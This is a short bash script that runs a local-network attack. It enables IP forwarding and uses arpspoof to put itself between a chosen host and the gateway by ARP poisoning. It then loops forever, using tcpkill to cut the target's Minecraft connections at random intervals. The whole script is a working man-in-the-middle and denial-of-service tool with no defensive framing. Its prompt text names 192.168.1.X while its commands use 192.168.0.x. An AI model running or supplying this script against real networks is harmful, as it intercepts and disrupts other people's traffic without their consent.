#!/bin/bash

echo "IP adress of 192.168.1.X"
read IP
{
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.0.$IP 192.168.0.1 & arpspoof -i eth0 -t 192.168.0.1 192.168.0.$IP &
} &> /dev/null

echo "Delay in seconds"
read sec
sleep $sec

while true
do

tcpkill -9 host www.minecraft.net or port 25565 &
r=$[ ( $RANDOM % 20 )  + 10 ]; echo Attacking for $r seconds; sleep $r
killall tcpkill
r2=$[ ( $RANDOM % 120 )  + 60 ]; echo Sleeping for $r2 seconds; sleep $r2

done
